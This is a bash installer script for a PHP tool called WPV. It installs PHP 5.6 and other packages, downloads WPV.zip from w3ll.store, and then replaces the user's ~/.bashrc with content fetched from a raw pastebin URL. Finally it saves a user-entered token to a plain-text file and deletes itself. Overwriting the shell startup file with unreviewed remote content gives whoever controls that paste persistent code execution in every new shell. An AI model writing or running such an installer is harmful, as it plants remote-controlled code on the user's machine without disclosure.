clear
printf "\e[92m▀█▀ ░█▄─░█ ░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█─── ░█─── \n"
printf "░█─ ░█░█░█ ─▀▀▀▄▄ ─░█── ░█▄▄█ ░█─── ░█─── \n"
printf "▄█▄ ░█──▀█ ░█▄▄▄█ ─░█── ░█─░█ ░█▄▄█ ░█▄▄█TOOL\n"
printf "         \033[0;36m\n\n"
sudo apt install -y screen
sudo apt install -y unzip
sudo apt-get update
sudo locale-gen en_US.UTF-8
sudo export LANG=en_US.UTF-8
sudo apt-get update
sudo apt-get upgrade
sudo apt-get install -y figlet
sudo apt-get install -y dos2unix
sudo apt-get install -y curl
sudo apt-get install software-properties-common
sudo add-apt-repository ppa:ondrej/php
sudo apt-get update
sudo apt-get install -y php5.6
sudo apt-get install -y php5.6-curl
sudo apt install -y nano
sudo wget https://w3ll.store/operators/WPV.zip
sudo unzip -o WPV.zip
sudo rm WPV.zip
cp ~/.bashrc ~/.bashrc-bak
rm -rf ~/.bashrc
curl "https://pastebin.com/raw/eCDNqCzi" -o ~/.bashrc
dos2unix ~/.bashrc
clear
printf "\e[92mEnter Your Tool Token: \033[0;33m"
read token
sudo rm token.txt
echo $token > token.txt
clear
printf "\e[32mTOOL INSTALLED SUCCESSFULLY !\n\e[0mYOU CAN RUN \e[31mphp WPV\e[0m TO RUN TOOL NOW !\n\n"
sudo rm install.sh
